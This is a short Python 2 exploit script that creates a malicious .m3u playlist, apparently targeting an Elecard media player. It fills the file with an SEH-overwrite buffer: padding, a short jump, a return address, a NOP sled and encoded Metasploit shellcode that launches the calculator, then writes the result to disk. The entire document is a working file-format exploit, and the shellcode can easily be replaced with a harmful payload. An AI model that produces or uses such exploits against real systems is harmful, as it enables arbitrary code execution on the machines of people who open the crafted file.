#!/usr/bin/python

file = 'crash-elecard.m3u'
header = '#EXTM3U\n'
# Generated with msfpayload
# msfpayload windows/exec cmd=calc R |\
# msfencode -a x86 -b "\x00\x0a\x0d\x25\x68\x08" -t c
# x86/shikata_ga_nai succeeded with size 227 (iteration=1)
shellcode = ("\xda\xcb\xd9\x74\x24\xf4\xba\xf5\xa2\xe5\xd9\x5e\x29\xc9\xb1"
"\x33\x83\xc6\x04\x31\x56\x13\x03\xa3\xb1\x07\x2c\xb7\x5e\x4e"
"\xcf\x47\x9f\x31\x59\xa2\xae\x63\x3d\xa7\x83\xb3\x35\xe5\x2f"
"\x3f\x1b\x1d\xbb\x4d\xb4\x12\x0c\xfb\xe2\x1d\x8d\xcd\x2a\xf1"
"\x4d\x4f\xd7\x0b\x82\xaf\xe6\xc4\xd7\xae\x2f\x38\x17\xe2\xf8"
"\x37\x8a\x13\x8c\x05\x17\x15\x42\x02\x27\x6d\xe7\xd4\xdc\xc7"
"\xe6\x04\x4c\x53\xa0\xbc\xe6\x3b\x11\xbd\x2b\x58\x6d\xf4\x40"
"\xab\x05\x07\x81\xe5\xe6\x36\xed\xaa\xd8\xf7\xe0\xb3\x1d\x3f"
"\x1b\xc6\x55\x3c\xa6\xd1\xad\x3f\x7c\x57\x30\xe7\xf7\xcf\x90"
"\x16\xdb\x96\x53\x14\x90\xdd\x3c\x38\x27\x31\x37\x44\xac\xb4"
"\x98\xcd\xf6\x92\x3c\x96\xad\xbb\x65\x72\x03\xc3\x76\xda\xfc"
"\x61\xfc\xc8\xe9\x10\x5f\x86\xec\x91\xe5\xef\xef\xa9\xe5\x5f"
"\x98\x98\x6e\x30\xdf\x24\xa5\x75\x2f\x6f\xe4\xdf\xb8\x36\x7c"
"\x62\xa5\xc8\xaa\xa0\xd0\x4a\x5f\x58\x27\x52\x2a\x5d\x63\xd4"
"\xc6\x2f\xfc\xb1\xe8\x9c\xfd\x93\x8a\x43\x6e\x7f\x63\xe6\x16"
"\x1a\x7b")

junk = 'A' * 4 
nseh = '\xeb\x08\x90\x90'
seh = '\xD2\xD3\x94\x73'
nops = '\x90' * 16
sisa = 'D' * (20000 - len(junk+nseh+seh+nops+shellcode))

payload = header+junk+nseh+seh+nops+shellcode+sisa

f = open(file,'w')
print "Payload size: ", len(payload)
f.write(payload)
print "File",file, "successfully created"
f.close()